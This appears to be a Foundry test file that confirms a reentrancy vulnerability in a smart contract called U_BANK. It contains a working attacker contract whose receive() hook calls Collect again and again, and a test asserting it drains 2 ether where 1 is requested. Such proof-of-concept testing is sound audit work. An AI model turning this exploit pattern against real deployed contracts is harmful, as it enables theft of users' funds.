// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x7541b76cb60f4c60af330c208b0623b7f54bf615.sol";

// Mock Log contract implementation
contract MockLog {
    event MessageAdded(address indexed sender, uint256 value, string data);
    
    function AddMessage(address _adr, uint _val, string memory _data) public {
        emit MessageAdded(_adr, _val, _data);
    }
}

contract MaliciousReentrancy {
    U_BANK public bank;
    uint256 public amount;
    
    constructor(U_BANK _bank) payable {
        bank = _bank;
    }

    function deposit(uint256 unlockTime) public payable {
        bank.Put{value: msg.value}(unlockTime);
    }

    function initiateAttack(uint256 _amount) public {
        amount = _amount;
        bank.Collect(_amount);
    }

    receive() external payable {
        if (address(bank).balance >= amount) {
            bank.Collect(amount);
        }
    }
}

contract U_BANK_ReentrancyTest is Test {
    MockLog public mockLog;
    MaliciousReentrancy public attacker;
    U_BANK public bank;

    function setUp() public {
        // Deploy mock Log contract
        mockLog = new MockLog();
        
        // Deploy U_BANK with mock Log
        bank = new U_BANK(address(mockLog));
        
        // Deploy attacker contract with initial balance
        attacker = new MaliciousReentrancy{value: 2 ether}(bank);
    }

    function testReentrancyVulnerability() public {
        // Set valid unlock time (current time + 1 day)
        uint256 unlockTime = block.timestamp + 1 days;
        
        // Attacker deposits 2 ether
        attacker.deposit{value: 2 ether}(unlockTime);
        assertEq(address(bank).balance, 2 ether, "Initial deposit failed");

        // Advance past unlock time
        vm.warp(unlockTime + 1);

        // Differential state checks - BEFORE
        console.log("--- BEFORE-Trigger BALANCES ---");
        uint256 initialBankBalance = address(bank).balance;
        uint256 initialAttackerBalance = address(attacker).balance;
        console.log("Bank ETH balance:", initialBankBalance);
        console.log("Attacker ETH balance:", initialAttackerBalance);

        console.log("--- TRIGGER REENTRANCY ATTACK ---");
        // Initiate attack (1 ether per withdrawal)
        attacker.initiateAttack(1 ether);

        // Differential state checks - AFTER
        console.log("--- AFTER-Trigger BALANCES ---");
        uint256 finalBankBalance = address(bank).balance;
        uint256 finalAttackerBalance = address(attacker).balance;
        console.log("Bank ETH balance:", finalBankBalance);
        console.log("Attacker ETH balance:", finalAttackerBalance);

        // Calculate balance changes
        uint256 bankBalanceChange = initialBankBalance - finalBankBalance;
        uint256 attackerBalanceChange = finalAttackerBalance - initialAttackerBalance;
        console.log("Bank balance change:", bankBalanceChange);
        console.log("Attacker balance change:", attackerBalanceChange);

        // Vulnerability verification logic
        bool reentrancySuccess = (bankBalanceChange == 2 ether && 
                                  attackerBalanceChange == 2 ether);
        
        if (reentrancySuccess) {
            console.log("Vulnerability Exists: Attacker performed reentrancy withdrawing 2 ether instead of allowed 1 ether");
        } else {
            console.log("Vulnerability not Exist: Bank/attacker balance changes don't show double withdrawal");
        }

        // Original assertions remain intact
        assertEq(
            finalBankBalance,
            initialBankBalance - 2 ether,
            "Bank balance not reduced properly"
        );
        
        assertEq(
            finalAttackerBalance,
            initialAttackerBalance + 2 ether,
            "Attacker balance not increased properly"
        );
    }
}